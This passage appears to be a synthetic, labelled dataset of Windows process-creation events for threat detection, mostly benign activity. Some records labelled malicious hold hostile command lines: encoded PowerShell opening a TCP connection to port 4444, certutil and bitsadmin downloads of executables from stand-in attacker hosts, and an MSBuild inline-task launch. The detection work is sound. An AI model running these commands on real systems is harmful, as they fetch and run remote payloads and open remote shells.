  {
    "UtcTime": "2024-07-04T13:39:20.504Z",
    "ProcessGuid": "{7BD71F20-4A14-409A-98DC-2DB115AF013E}",
    "ProcessId": 59859,
    "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "CommandLine": "msedge.exe --type=gpu-process",
    "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
    "ParentProcessId": 58736,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T15:47:12.240Z",
    "ProcessGuid": "{DC9483D6-13A5-4D7A-8C2F-7CA3EDAB4F7D}",
    "ProcessId": 49197,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe https://sharepoint.corp.local/sites/team",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentProcessId": 16863,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:37:51.759Z",
    "ProcessGuid": "{F80C84DA-5CAC-4ACB-9EF4-58942D44CD62}",
    "ProcessId": 60497,
    "Image": "C:\\Windows\\System32\\odbcad32.exe",
    "CommandLine": "odbcad32.exe",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentProcessId": 50908,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T15:39:17.899Z",
    "ProcessGuid": "{8C1900FC-376D-49B3-9FC2-9A45D3563B2E}",
    "ProcessId": 49042,
    "Image": "C:\\Windows\\System32\\msiexec.exe",
    "CommandLine": "msiexec.exe /i C:\\Installers\\app_setup_3.2.42.msi /quiet",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 7091,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T04:10:42.639Z",
    "ProcessGuid": "{F72BBAEB-B64A-4E9D-9D0A-D269B51B333F}",
    "ProcessId": 48227,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k NetworkService",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 60113,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T05:31:52.920Z",
    "ProcessGuid": "{F04C5485-A054-4288-86D4-5FAD0A07822A}",
    "ProcessId": 46193,
    "Image": "C:\\Windows\\System32\\wininit.exe",
    "CommandLine": "wininit.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 47061,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T14:14:28.603Z",
    "ProcessGuid": "{7EE71AFD-6F9A-4F4B-A818-E13567BA3A2C}",
    "ProcessId": 19231,
    "Image": "C:\\Program Files\\Microsoft\\Teams\\current\\Teams.exe",
    "CommandLine": "Teams.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 54046,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T12:38:47.844Z",
    "ProcessGuid": "{6D51EAC7-0C5F-4B88-8B2F-37E08F8603EC}",
    "ProcessId": 38303,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 61371,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T10:31:18.143Z",
    "ProcessGuid": "{48C4D452-8DA2-49E8-A290-5B15DDD91692}",
    "ProcessId": 13261,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 21616,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T02:46:58.944Z",
    "ProcessGuid": "{DAC798CA-F33D-4ABD-91E7-A738844BC621}",
    "ProcessId": 29973,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 23196,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.001",
    "technique_name": "PowerShell Encoded Command",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T14:49:12.902Z",
    "ProcessGuid": "{25CFC9F8-24A5-44A8-95AD-3E1CC4A50054}",
    "ProcessId": 20761,
    "Image": "C:\\Windows\\System32\\regsvr32.exe",
    "CommandLine": "regsvr32.exe /s C:\\Program Files\\Common Files\\System\\Ole DB\\oledb32.dll",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 6523,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-01T10:42:51.580Z",
    "ProcessGuid": "{213047FC-50B1-409D-AE75-7593B670B447}",
    "ProcessId": 56853,
    "Image": "C:\\Windows\\System32\\mmc.exe",
    "CommandLine": "mmc.exe diskmgmt.msc",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 4564,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:56:08.450Z",
    "ProcessGuid": "{FFF3FD43-4901-442C-A6E8-7DFCE69B4313}",
    "ProcessId": 11853,
    "Image": "C:\\Windows\\System32\\resmon.exe",
    "CommandLine": "resmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 16072,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T17:30:15.803Z",
    "ProcessGuid": "{FABFF7D7-4115-476D-8C20-01F73DEDFCE3}",
    "ProcessId": 31996,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 53920,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T08:46:09.419Z",
    "ProcessGuid": "{D5AD0691-224C-4F7B-84DD-F45809FC2193}",
    "ProcessId": 58077,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 43911,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T10:19:00.971Z",
    "ProcessGuid": "{052FEF7A-928A-4BAF-93ED-B91353A273DB}",
    "ProcessId": 26932,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Set-ExecutionPolicy RemoteSigned -Scope CurrentUser\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 22772,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T17:38:29.646Z",
    "ProcessGuid": "{DEDBE847-3CD9-42DB-A4D0-D8D6B298BBD6}",
    "ProcessId": 50080,
    "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "CommandLine": "msedge.exe --type=gpu-process",
    "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
    "ParentProcessId": 42671,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T13:08:24.881Z",
    "ProcessGuid": "{210F7484-673A-46C6-9A56-2F995D734255}",
    "ProcessId": 55982,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Set-ExecutionPolicy RemoteSigned -Scope CurrentUser\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 38249,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T00:39:54.372Z",
    "ProcessGuid": "{3C5D4B80-F167-4BFF-B3E2-1B56A55F47AA}",
    "ProcessId": 51857,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 41645,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:44:15.585Z",
    "ProcessGuid": "{37D639B0-1A42-41B7-B2ED-125BB8321F49}",
    "ProcessId": 26098,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 16306,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T03:57:21.800Z",
    "ProcessGuid": "{1649896C-8673-4C29-9F6D-83185C8D2106}",
    "ProcessId": 25727,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Restart-Service -Name W3SVC -Force\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 32144,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-05T10:43:24.173Z",
    "ProcessGuid": "{5C792841-D927-46B0-B55D-FC296F422828}",
    "ProcessId": 10099,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 18623,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T09:43:49.140Z",
    "ProcessGuid": "{B2AAC229-E6D9-460C-938C-C0139C167216}",
    "ProcessId": 1339,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net user",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 64210,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T09:38:01.530Z",
    "ProcessGuid": "{242C0252-391B-4CA1-9815-725DF68D664E}",
    "ProcessId": 9852,
    "Image": "C:\\Windows\\System32\\fontdrvhost.exe",
    "CommandLine": "fontdrvhost.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 59348,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T01:46:04.854Z",
    "ProcessGuid": "{ADB7070B-CB9D-4BB2-A85D-BAF524DE6748}",
    "ProcessId": 20916,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 6107,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T03:37:01.783Z",
    "ProcessGuid": "{6EA1A1F9-9DC0-49AE-A8F1-3FCBE52C6BD5}",
    "ProcessId": 59415,
    "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe",
    "CommandLine": "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\MSBuild.exe C:\\Users\\Public\\runtime329.csproj",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 41970,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1127.001",
    "technique_name": "MSBuild Inline Task",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T16:39:10.372Z",
    "ProcessGuid": "{2B51E73E-9032-4080-91E1-920565C32528}",
    "ProcessId": 25435,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 61157,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T10:11:05.624Z",
    "ProcessGuid": "{87EF85B2-5BB3-4D11-8018-2E561DE0417D}",
    "ProcessId": 58071,
    "Image": "C:\\Program Files\\Slack\\Slack.exe",
    "CommandLine": "Slack.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 26070,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T04:36:42.410Z",
    "ProcessGuid": "{2FABA2F5-3B1A-4F29-8D9C-A169A7A0C725}",
    "ProcessId": 5560,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 10297,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T17:55:50.083Z",
    "ProcessGuid": "{8939ED90-E15C-49AE-A127-09F7D234221D}",
    "ProcessId": 35439,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c hostname",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 30278,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T13:15:19.897Z",
    "ProcessGuid": "{B7C4B725-3CBC-4A13-AF0F-6C8C923FADC0}",
    "ProcessId": 10388,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net user",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 44267,
    "User": "CORP\\netadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T18:17:54.148Z",
    "ProcessGuid": "{CB71C57D-2C89-4153-949C-99977B6DA98F}",
    "ProcessId": 9519,
    "Image": "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 36403,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T17:30:12.980Z",
    "ProcessGuid": "{BDFB3987-F6F9-49D8-87A2-E73200774F9D}",
    "ProcessId": 17155,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c net localgroup administrators",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 19284,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:27:34.388Z",
    "ProcessGuid": "{C6BE10A5-29E3-4FC8-9154-6D150EEBD9F5}",
    "ProcessId": 54959,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c ipconfig /all",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 16051,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:18:40.729Z",
    "ProcessGuid": "{8882B440-075F-4225-AC61-F599CC85EFF8}",
    "ProcessId": 33836,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-WmiObject Win32_OperatingSystem | Select Caption, Version\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 51273,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T01:13:53.877Z",
    "ProcessGuid": "{D0AC9678-9DF6-4B62-A406-2E6149327C7A}",
    "ProcessId": 22482,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 10720,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T16:39:44.604Z",
    "ProcessGuid": "{86218875-9E49-4371-B44B-D199CE837117}",
    "ProcessId": 17773,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 4216,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T13:59:32.108Z",
    "ProcessGuid": "{E1898C1C-B780-4C0E-B342-0CA32B8F04B0}",
    "ProcessId": 19994,
    "Image": "C:\\Windows\\System32\\taskmgr.exe",
    "CommandLine": "taskmgr.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 52569,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T18:02:04.072Z",
    "ProcessGuid": "{2F59BDF8-58B2-44A5-8E7E-2C6DC1553BDB}",
    "ProcessId": 38443,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil  -urlcache -split -f http://darkops6442.org/downloads/core504.exe C:\\Users\\Public\\svc148.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 48680,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1105",
    "technique_name": "Certutil Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T01:31:37.994Z",
    "ProcessGuid": "{679F07F7-35EF-4DD6-AFE0-16296AC8716F}",
    "ProcessId": 25759,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer job6474 /download /priority high http://c2-server8062.io/helper320.exe C:\\Users\\Public\\loader783.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 41431,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1197",
    "technique_name": "BITSAdmin Download",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T15:14:22.566Z",
    "ProcessGuid": "{6FDBCC57-8C41-416D-B510-79B5B6286672}",
    "ProcessId": 62678,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c dir C:\\Users",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 25603,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T02:05:20.056Z",
    "ProcessGuid": "{49E37D58-CE33-4620-B16E-970DDEE0B4A5}",
    "ProcessId": 40855,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 43029,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.001",
    "technique_name": "PowerShell Encoded Command",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-04T11:28:51.298Z",
    "ProcessGuid": "{1B816D35-F846-45B8-83FD-55B379410852}",
    "ProcessId": 55478,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 46405,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T10:40:42.442Z",
    "ProcessGuid": "{DDB69EF6-6B57-4346-9E3E-1BB1EE335479}",
    "ProcessId": 26924,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ChildItem -Path C:\\Logs -Recurse -Filter *.log\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 2913,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:44:59.898Z",
    "ProcessGuid": "{65708679-D01F-4F97-9CF2-1084E03D43F0}",
    "ProcessId": 25187,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 30798,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T14:17:14.076Z",
    "ProcessGuid": "{A2A270CB-C25D-4F4C-B1E4-132319F7C29C}",
    "ProcessId": 62836,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 14284,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T12:14:23.081Z",
